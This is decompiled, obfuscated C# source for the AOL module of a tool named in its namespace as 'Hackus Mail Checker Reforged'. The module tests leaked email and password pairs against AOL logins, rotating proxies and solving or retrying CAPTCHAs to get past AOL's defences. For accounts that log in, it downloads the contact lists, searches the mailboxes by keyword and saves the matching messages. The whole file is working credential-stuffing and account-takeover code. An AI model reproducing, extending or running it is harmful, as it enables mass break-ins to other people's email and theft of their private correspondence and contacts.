using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net.Web
{
	// Token: 0x020000B9 RID: 185
	public class AolClient
	{
		// Token: 0x1700013C RID: 316
		// (get) Token: 0x060005DE RID: 1502 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x060005DF RID: 1503 RVA: 0x00009D79 File Offset: 0x00007F79
		public AolClient(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x060005E0 RID: 1504 RVA: 0x00027708 File Offset: 0x00025908
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x060005E1 RID: 1505 RVA: 0x0002777C File Offset: 0x0002597C
		public OperationResult Login()
		{
			int num = 0;
			for (;;)
			{
				this.Reset();
				OperationResult operationResult = this.CreateSession();
				if (operationResult == OperationResult.Blocked)
				{
					if (!ProxySettings.Instance.UseProxy)
					{
						return OperationResult.Error;
					}
				}
				if (operationResult == OperationResult.Ok)
				{
					string captchaUrl;
					operationResult = this.ConfirmUsername(out captchaUrl);
					if (operationResult != OperationResult.HttpError)
					{
						if (operationResult == OperationResult.Captcha)
						{
							if (WebSettings.Instance.SolveCaptcha && !string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
							{
								OperationResult operationResult2 = this.GetSitekey(captchaUrl);
								if (operationResult2 == OperationResult.Error)
								{
									return operationResult2;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
								ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveRecaptchaV2Proxyless(this._siteKey, <Module>.smethod_3<string>(2069927226));
								OperationResult item = valueTuple.Item1;
								string item2 = valueTuple.Item2;
								if (item == OperationResult.Error)
								{
									return OperationResult.Error;
								}
								if (item == OperationResult.HttpError)
								{
									continue;
								}
								operationResult2 = this.ConfirmCaptcha(item2, false);
								if (operationResult2 == OperationResult.Error)
								{
									break;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
							}
							else
							{
								if (!ProxySettings.Instance.UseProxy)
								{
									return OperationResult.Captcha;
								}
								if (WebSettings.Instance.RebruteCaptcha && num < WebSettings.Instance.RebruteCaptchaLimit)
								{
									num++;
									continue;
								}
								return OperationResult.Captcha;
							}
						}
						else if (operationResult != OperationResult.Ok)
						{
							return operationResult;
						}
						string text;
						operationResult = this.ConfirmPassword(out text);
						if (operationResult != OperationResult.HttpError)
						{
							if (operationResult != OperationResult.Captcha)
							{
								if (operationResult != OperationResult.Ok)
								{
									return operationResult;
								}
							}
							else
							{
								if (!WebSettings.Instance.SolveCaptcha || string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
								{
									return OperationResult.Captcha;
								}
								ValueTuple<OperationResult, string> valueTuple2 = CaptchaHelpers.CreateInstance().SolveRecaptchaV2Proxyless(this._siteKey, <Module>.smethod_5<string>(1500698071));
								OperationResult item3 = valueTuple2.Item1;
								string item4 = valueTuple2.Item2;
								if (item3 == OperationResult.Error)
								{
									return OperationResult.Error;
								}
								if (item3 == OperationResult.HttpError)
								{
									continue;
								}
								operationResult = this.ConfirmSecondCaptcha(item4);
							}
							if (operationResult != OperationResult.HttpError)
							{
								return operationResult;
							}
						}
					}
				}
			}
			return OperationResult.Error;
		}

		// Token: 0x060005E2 RID: 1506 RVA: 0x00027928 File Offset: 0x00025B28
		public OperationResult CreateSession()
		{
			this.WaitPause();
			try
			{
				string text = this._httpRequest.Get(<Module>.smethod_3<string>(-1060857419), null).ToString();
				if (text == <Module>.smethod_3<string>(103325232))
				{
					return OperationResult.Blocked;
				}
				Match match = Regex.Match(text, <Module>.smethod_6<string>(1894806195));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._crumb = match.Groups[1].Value;
				match = Regex.Match(text, <Module>.smethod_6<string>(-771512757));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._acrumb = match.Groups[1].Value;
				match = Regex.Match(text, <Module>.smethod_6<string>(2066767619));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._sessionIndex = match.Groups[1].Value;
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005E3 RID: 1507 RVA: 0x00027A38 File Offset: 0x00025C38
		public OperationResult ConfirmUsername(out string captchaUrl)
		{
			captchaUrl = null;
			this.WaitPause();
			try
			{
				this._httpRequest.AddHeader(<Module>.smethod_6<string>(578231860), <Module>.smethod_5<string>(853751315));
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>(<Module>.smethod_2<string>(-742435430), this._crumb),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(1030826796), this._acrumb),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(-1190529069), this._sessionIndex),
					new KeyValuePair<string, string>(<Module>.smethod_3<string>(-127570632), <Module>.smethod_4<string>(-678169520)),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(461623556), this._mailbox.Address)
				}, false, null);
				string text = this._httpRequest.Post(<Module>.smethod_5<string>(-1311615358), formUrlEncodedContent).ToString();
				if (text.ContainsOne(new string[]
				{
					<Module>.smethod_5<string>(-747721955),
					<Module>.smethod_4<string>(-770139588),
					<Module>.smethod_2<string>(489750054),
					<Module>.smethod_2<string>(-2140543470)
				}))
				{
					return OperationResult.Bad;
				}
				if (text.ContainsOne(new string[]
				{
					<Module>.smethod_3<string>(1117432185),
					<Module>.smethod_4<string>(28741110),
					<Module>.smethod_3<string>(-1130112951),
					<Module>.smethod_2<string>(-1675415492)
				}))
				{
					return OperationResult.Blocked;
				}
				if (!text.Contains(<Module>.smethod_6<string>(44337029)))
				{
					if (text.Contains(<Module>.smethod_2<string>(-46006352)))
					{
						return OperationResult.Ok;
					}
					if (text == <Module>.smethod_3<string>(103325232) && ProxySettings.Instance.UseProxy)
					{
						return OperationResult.HttpError;
					}
					return OperationResult.Error;
				}
				else
				{
					Match match = Regex.Match(text, <Module>.smethod_2<string>(1237763609));
					if (match.Success)
					{
						captchaUrl = <Module>.smethod_2<string>(-1615559533) + match.Groups[1].Value;
						return OperationResult.Captcha;
					}
					return OperationResult.Blocked;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005E4 RID: 1508 RVA: 0x00027C88 File Offset: 0x00025E88
		public OperationResult ConfirmPassword(out string captchaUrl)
		{
			captchaUrl = null;
			this.WaitPause();
			try
			{
				this._httpRequest.Reconnect = true;
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(551711604), <Module>.smethod_2<string>(-592832719));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(771888973), this._sessionIndex);
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(1689622660), this._acrumb);
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(1904177939), <Module>.smethod_4<string>(-1899046013));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(957719292), <Module>.smethod_2<string>(938558187));
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(-451806899), this._crumb),
					new KeyValuePair<string, string>(<Module>.smethod_4<string>(1689622660), this._acrumb),
					new KeyValuePair<string, string>(<Module>.smethod_2<string>(1754575228), this._sessionIndex),
					new KeyValuePair<string, string>(<Module>.smethod_4<string>(-1728918827), <Module>.smethod_4<string>(-678169520)),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(461623556), this._mailbox.Address),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(1029097011), this._mailbox.Address),
					new KeyValuePair<string, string>(<Module>.smethod_4<string>(893801997), this._mailbox.Password),
					new KeyValuePair<string, string>(<Module>.smethod_3<string>(-727939560), <Module>.smethod_2<string>(1637612207)),
					new KeyValuePair<string, string>(<Module>.smethod_3<string>(-1851712128), <Module>.smethod_5<string>(397152302))
				}, false, null);
				string text = this._httpRequest.Post(<Module>.smethod_4<string>(798771894), formUrlEncodedContent).ToString();
				if (text.ContainsOne(new string[]
				{
					<Module>.smethod_3<string>(-366176252),
					<Module>.smethod_5<string>(550146607)
				}))
				{
					this._apiAuthorizeUrl = this._httpRequest.Response.Location;
					return OperationResult.Ok;
				}
				if (text.Contains(<Module>.smethod_3<string>(-200548770)))
				{
					Match match = Regex.Match(text, <Module>.smethod_6<string>(-1197448209));
					if (match.Success)
					{
						captchaUrl = <Module>.smethod_4<string>(701381500) + match.Groups[1].Value;
						return OperationResult.Captcha;
					}
					return OperationResult.Blocked;
				}
				else
				{
					if (text.ContainsOne(new string[]
					{
						<Module>.smethod_2<string>(-2072539984),
						<Module>.smethod_4<string>(-1481858537),
						<Module>.smethod_2<string>(772635631),
						<Module>.smethod_3<string>(-1971014938)
					}))
					{
						return OperationResult.Blocked;
					}
					if (text.ContainsOne(new string[]
					{
						<Module>.smethod_6<string>(-1795345085),
						<Module>.smethod_2<string>(1022881518),
						<Module>.smethod_2<string>(489750054)
					}))
					{
						return OperationResult.Bad;
					}
					if (text == <Module>.smethod_6<string>(1152624455) && ProxySettings.Instance.UseProxy)
					{
						return OperationResult.HttpError;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005E5 RID: 1509 RVA: 0x00027FFC File Offset: 0x000261FC
		public OperationResult GetSitekey(string captchaUrl)
		{
			this.WaitPause();
			try
			{
				Match match = Regex.Match(this._httpRequest.Get(captchaUrl, null).ToString(), <Module>.smethod_4<string>(-1912858963));
				if (match.Success)
				{
					this._siteKey = match.Groups[1].Value;
					return OperationResult.Ok;
				}
				return OperationResult.Error;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005E6 RID: 1510 RVA: 0x00028080 File Offset: 0x00026280
		public OperationResult ConfirmCaptcha(string captchaResult, bool isSecondCaptcha = false)
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-2082185028), <Module>.smethod_5<string>(661017790));
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(-939654767), this._sessionIndex);
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(506069899), this._acrumb);
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(1904177939), <Module>.smethod_5<string>(1847220535));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(957719292), <Module>.smethod_3<string>(-1892122211));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(-478690406), <Module>.smethod_3<string>(1280999956));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(-1238495870), <Module>.smethod_3<string>(-1051087952));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(157227388), <Module>.smethod_6<string>(-641778882));
				if (isSecondCaptcha)
				{
					this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(1239388958), <Module>.smethod_3<string>(45766606));
					this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-755944692), <Module>.smethod_5<string>(-940057223));
				}
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(-1017550569), captchaResult),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(1030826796), this._acrumb),
					new KeyValuePair<string, string>(<Module>.smethod_5<string>(771888973), this._sessionIndex),
					new KeyValuePair<string, string>(<Module>.smethod_5<string>(-1808349968), <Module>.smethod_4<string>(-586199452))
				}, false, null);
				if (!this._httpRequest.Post(<Module>.smethod_5<string>(-325696101), formUrlEncodedContent).ToString().Contains(<Module>.smethod_5<string>(835470973)))
				{
					return OperationResult.Error;
				}
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005E7 RID: 1511 RVA: 0x000282B8 File Offset: 0x000264B8
		public OperationResult ConfirmSecondCaptcha(string captchaResult)
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-2082185028), <Module>.smethod_5<string>(661017790));
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(-939654767), this._sessionIndex);
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(1689622660), this._acrumb);
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(1904177939), <Module>.smethod_5<string>(1847220535));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(275948997), <Module>.smethod_4<string>(-586199452));
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(1139844539), <Module>.smethod_5<string>(1763768925));
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(-513462660), <Module>.smethod_5<string>(115404729));
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(1152227209), <Module>.smethod_5<string>(1510633816));
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(1315936954), <Module>.smethod_4<string>(-35515321));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(1602353181), <Module>.smethod_4<string>(893801997));
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(-1017550569), captchaResult),
					new KeyValuePair<string, string>(<Module>.smethod_2<string>(506069899), this._acrumb),
					new KeyValuePair<string, string>(<Module>.smethod_4<string>(-939654767), this._sessionIndex),
					new KeyValuePair<string, string>(<Module>.smethod_3<string>(1321410039), <Module>.smethod_5<string>(1568651498))
				}, false, null);
				string original = this._httpRequest.Post(<Module>.smethod_2<string>(1289447250), formUrlEncodedContent).ToString();
				if (original.ContainsOne(new string[]
				{
					<Module>.smethod_3<string>(-366176252),
					<Module>.smethod_4<string>(-251977413)
				}))
				{
					return OperationResult.Ok;
				}
				if (original.ContainsOne(new string[]
				{
					<Module>.smethod_2<string>(-2072539984),
					<Module>.smethod_4<string>(-1481858537),
					<Module>.smethod_3<string>(1117432185),
					<Module>.smethod_2<string>(1504329341)
				}))
				{
					return OperationResult.Blocked;
				}
				if (!original.ContainsOne(new string[]
				{
					<Module>.smethod_3<string>(1481122932),
					<Module>.smethod_4<string>(629256715),
					<Module>.smethod_2<string>(489750054)
				}))
				{
					return OperationResult.Error;
				}
				return OperationResult.Bad;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005E8 RID: 1512 RVA: 0x00028588 File Offset: 0x00026788
		public OperationResult GetSearchToken()
		{
			this.WaitPause();
			try
			{
				this._httpRequest.Reconnect = true;
				this._httpRequest.ReconnectLimit = 3;
				if (this._apiAuthorizeUrl.Contains(<Module>.smethod_5<string>(-1596939724)))
				{
					Match match = Regex.Match(this._httpRequest.Get(this._apiAuthorizeUrl, null).ToString(), <Module>.smethod_2<string>(508794005));
					if (match.Success)
					{
						this._apiAuthorizeUrl = match.Groups[1].Value;
					}
				}
				string location = this._httpRequest.Get(this._apiAuthorizeUrl, null).Location;
				if (location == null || !location.Contains(<Module>.smethod_4<string>(-1294858366)))
				{
					return OperationResult.Error;
				}
				location = this._httpRequest.Get(location, null).Location;
				if (location == null || !location.Contains(<Module>.smethod_3<string>(911526892)))
				{
					return OperationResult.Error;
				}
				location = this._httpRequest.Get(location, null).Location;
				if (location == null || !location.Contains(<Module>.smethod_3<string>(349640608)))
				{
					return OperationResult.Error;
				}
				location = this._httpRequest.Get(location, null).Location;
				if (location == null || !location.Contains(<Module>.smethod_4<string>(1447370689)))
				{
					return OperationResult.Error;
				}
				location = this._httpRequest.Get(location, null).Location;
				if (location == null || !location.Contains(<Module>.smethod_4<string>(-1884009049)))
				{
					return OperationResult.Error;
				}
				location = this._httpRequest.Get(location, null).Location;
				if (location == null || !location.Contains(<Module>.smethod_6<string>(-1915412959)))
				{
					return OperationResult.Error;
				}
				location = this._httpRequest.Get(location, null).Location;
				if (location == null || !location.Contains(<Module>.smethod_6<string>(1046394861)))
				{
					return OperationResult.Error;
				}
				location = this._httpRequest.Get(location, null).Location;
				if (location != <Module>.smethod_2<string>(-592832719))
				{
					return OperationResult.Error;
				}
				Match match2 = Regex.Match(this._httpRequest.Get(<Module>.smethod_2<string>(1740979489), null).ToString(), <Module>.smethod_5<string>(171038509));
				if (match2.Success)
				{
					this._crumb = match2.Groups[1].Value;
					return OperationResult.Ok;
				}
				return OperationResult.Error;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			finally
			{
				this._httpRequest.Reconnect = false;
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005E9 RID: 1513 RVA: 0x00028850 File Offset: 0x00026A50
		public void ProcessValid()
		{
			if (!this.SearchSettings.Search && !SearchSettings.Instance.ParseContacts)
			{
				return;
			}
			if (this.GetSearchToken() != OperationResult.Ok)
			{
				return;
			}
			OperationResult operationResult = OperationResult.Retry;
			int num = 0;
			bool flag = false;
			bool flag2 = false;
			List<Request> list = new List<Request>();
			while (operationResult == OperationResult.Retry && num <= 2)
			{
				if (!flag && SearchSettings.Instance.ParseContacts)
				{
					operationResult = this.DownloadContacts();
					if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
					{
						flag = true;
					}
				}
				else
				{
					operationResult = OperationResult.Ok;
				}
				if (operationResult == OperationResult.Retry)
				{
					if (!ProxySettings.Instance.UseProxy)
					{
						break;
					}
					this._httpRequest.Proxy = ProxyManager.Instance.GetProxy();
				}
				else
				{
					if (!flag2 && this.SearchSettings.Search)
					{
						operationResult = this.SearchMessages(list);
						if (operationResult == OperationResult.Ok)
						{
							flag2 = true;
						}
					}
					else
					{
						operationResult = OperationResult.Ok;
					}
					if (operationResult != OperationResult.Retry)
					{
						if (operationResult == OperationResult.Bad)
						{
							break;
						}
					}
					else
					{
						if (!ProxySettings.Instance.UseProxy)
						{
							break;
						}
						this._httpRequest.Proxy = ProxyManager.Instance.GetProxy();
					}
				}
			}
			foreach (Request request in list)
			{
				int count = request.Count;
				if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
				{
					MailboxResult result = new MailboxResult(this._mailbox, request.ToString(), count);
					MailManager.Instance.AddResult(result);
					StatisticsManager.Instance.IncrementFound();
					FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request.ToString(), count);
				}
			}
		}

		// Token: 0x060005EA RID: 1514 RVA: 0x000289FC File Offset: 0x00026BFC
		public OperationResult DownloadContacts()
		{
			try
			{
				foreach (object obj in Regex.Matches(this._httpRequest.Get(<Module>.smethod_5<string>(-378151345), null).ToString(), <Module>.smethod_3<string>(1875586567)))
				{
					FileManager.SaveContact(((Match)obj).Groups[1].Value);
				}
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005EB RID: 1515 RVA: 0x00028AAC File Offset: 0x00026CAC
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => AolClient.<>c__DisplayClass23_0.smethod_0(r.Sender, request.Sender) && AolClient.<>c__DisplayClass23_0.smethod_0(r.Body, request.Body) && AolClient.<>c__DisplayClass23_0.smethod_0(r.Subject, request.Subject));
					if (request3 == null)
					{
						request3 = request.Clone();
						request3.FindedMids = new HashSet<Mid>();
						request3.SavedMids = new HashSet<Mid>();
						checkedRequests.Add(request3);
					}
					else if (request3.IsChecked || (request3.SavedMids != null && request3.SavedMids.Count >= this.SearchSettings.DownloadLettersLimit))
					{
						continue;
					}
					Request request2 = request3;
					if (!request2.FindedMids.Any<Mid>())
					{
						OperationResult operationResult = this.Search(request2);
						if (operationResult == OperationResult.Error)
						{
							request2.IsChecked = true;
							continue;
						}
						if (operationResult == OperationResult.HttpError)
						{
							return OperationResult.Retry;
						}
					}
					if (this.SearchSettings.DownloadLetters)
					{
						if (CheckerSettings.Instance.UsePop3Limit && request2.FindedMids.Count > CheckerSettings.Instance.Pop3Limit)
						{
							request3.FindedMids = new HashSet<Mid>(request3.FindedMids.Take(CheckerSettings.Instance.Pop3Limit));
						}
						using (HashSet<Mid>.Enumerator enumerator2 = request3.FindedMids.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								Mid mid = enumerator2.Current;
								if (!request3.SavedMids.Any((Mid u) => u == mid))
								{
									if (request3.SavedMids.Count >= this.SearchSettings.DownloadLettersLimit)
									{
										break;
									}
									MailMessage message;
									OperationResult operationResult2 = this.FetchMessage(mid, this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded, out message);
									if (operationResult2 != OperationResult.Error)
									{
										if (operationResult2 == OperationResult.HttpError)
										{
											return OperationResult.Retry;
										}
										request3.SavedMids.Add(mid);
										FileManager.SaveEazyWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
									}
									else
									{
										request3.SavedMids.Add(mid);
									}
								}
							}
						}
					}
					request2.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x060005EC RID: 1516 RVA: 0x00028D3C File Offset: 0x00026F3C
		private OperationResult Search(Request searchRequest)
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AllowAutoRedirect = true;
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(-371958569), 1);
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(961840339), this._crumb);
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(408150829), this.BuildSearchQuery(searchRequest));
				foreach (object obj in Regex.Matches(this._httpRequest.Get(<Module>.smethod_4<string>(-1172290100), null).ToString(), <Module>.smethod_5<string>(1632233498)))
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						string value = match.Groups[1].Value;
						DateTime date = DateTime.Parse(match.Groups[2].Value + <Module>.smethod_2<string>(1849819774) + match.Groups[3].Value);
						string value2 = match.Groups[4].Value;
						string value3 = match.Groups[5].Value;
						if (this.Validate(searchRequest, value2, value, date))
						{
							searchRequest.FindedMids.Add(new Mid(value3));
						}
					}
				}
				searchRequest.Count = searchRequest.FindedMids.Count;
				return OperationResult.Ok;
			}
			catch (HttpException)
			{
				return OperationResult.HttpError;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Error;
		}

		// Token: 0x060005ED RID: 1517 RVA: 0x00028F38 File Offset: 0x00027138
		private OperationResult FetchMessage(Mid mid, bool downloadAttachments, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				this._httpRequest.AllowAutoRedirect = false;
				Match match = Regex.Match(this._httpRequest.Get(<Module>.smethod_4<string>(561328242) + mid.MID, null).ToString(), <Module>.smethod_5<string>(-1438779358));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				message.Subject = match.Groups[1].Value;
				string[] array = match.Groups[2].Value.Replace(<Module>.smethod_3<string>(-370031130), <Module>.smethod_3<string>(2023933234)).Split(new char[]
				{
					' '
				});
				if (array.Length != 4)
				{
					message.Date = DateTime.Parse(match.Groups[2].Value.Replace(<Module>.smethod_5<string>(-30039613), <Module>.smethod_6<string>(820097393)));
				}
				else
				{
					message.Date = DateTime.Parse(string.Format(<Module>.smethod_4<string>(-1544978691), new object[]
					{
						array[0],
						array[1],
						DateTime.Now.Year,
						array[2],
						array[3]
					}));
				}
				message.From = match.Groups[3].Value;
				message.AlternateViews.Add(new Attachment(<Module>.smethod_6<string>(-2006787197), match.Groups[4].Value + <Module>.smethod_6<string>(-351479369)));
				return OperationResult.Ok;
			}
			catch (HttpException)
			{
				return OperationResult.HttpError;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Error;
		}

		// Token: 0x060005EE RID: 1518 RVA: 0x00029134 File Offset: 0x00027334
		private string BuildSearchQuery(Request request)
		{
			if (request.Body != null)
			{
				return request.Body;
			}
			return new string[]
			{
				request.Sender,
				request.Subject
			}.FirstOrDefault((string p) => p != null);
		}

		// Token: 0x060005EF RID: 1519 RVA: 0x0002918C File Offset: 0x0002738C
		private bool Validate(Request request, string from, string subject, DateTime date)
		{
			if (request.Sender != null && !from.ContainsIgnoreCase(request.Sender))
			{
				return false;
			}
			if (request.Subject != null && !subject.ContainsIgnoreCase(request.Subject))
			{
				return false;
			}
			if (!request.CheckDate)
			{
				if (SearchSettings.Instance.CheckDate)
				{
					if (SearchSettings.Instance.DateFrom != null && date < SearchSettings.Instance.DateFrom.Value)
					{
						return false;
					}
					if (SearchSettings.Instance.DateTo != null && date > SearchSettings.Instance.DateTo.Value.AddDays(1.0))
					{
						return false;
					}
				}
			}
			else
			{
				if (request.DateFrom != null && date < request.DateFrom.Value)
				{
					return false;
				}
				if (request.DateTo != null && date > request.DateTo.Value.AddDays(1.0))
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x060005F0 RID: 1520 RVA: 0x000292C0 File Offset: 0x000274C0
		private void Reset()
		{
			HttpRequest httpRequest = this._httpRequest;
			if (httpRequest != null)
			{
				httpRequest.Close();
			}
			this._httpRequest = new HttpRequest
			{
				ConnectTimeout = CheckerSettings.Instance.Timeout * 1000,
				ReadWriteTimeout = CheckerSettings.Instance.Timeout * 1000,
				Cookies = new CookieDictionary(false),
				IgnoreProtocolErrors = true,
				AllowAutoRedirect = false,
				KeepAlive = false,
				Reconnect = false,
				ReconnectLimit = 2,
				UserAgent = <Module>.smethod_5<string>(-1517859541)
			};
			if (ProxySettings.Instance.UseProxy)
			{
				this._httpRequest.Proxy = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x060005F1 RID: 1521 RVA: 0x00009B57 File Offset: 0x00007D57
		private bool IsAboveLimit(int count)
		{
			return !SearchSettings.Instance.UseSearchLimit || count >= SearchSettings.Instance.SearchLimit;
		}

		// Token: 0x060005F2 RID: 1522 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x04000317 RID: 791
		private Mailbox _mailbox;

		// Token: 0x04000318 RID: 792
		private HttpRequest _httpRequest;

		// Token: 0x04000319 RID: 793
		private string _crumb;

		// Token: 0x0400031A RID: 794
		private string _acrumb;

		// Token: 0x0400031B RID: 795
		private string _sessionIndex;

		// Token: 0x0400031C RID: 796
		private string _wssid;

		// Token: 0x0400031D RID: 797
		private string _mailboxId;

		// Token: 0x0400031E RID: 798
		private string _siteKey;

		// Token: 0x0400031F RID: 799
		private string _apiAuthorizeUrl;
	}
}
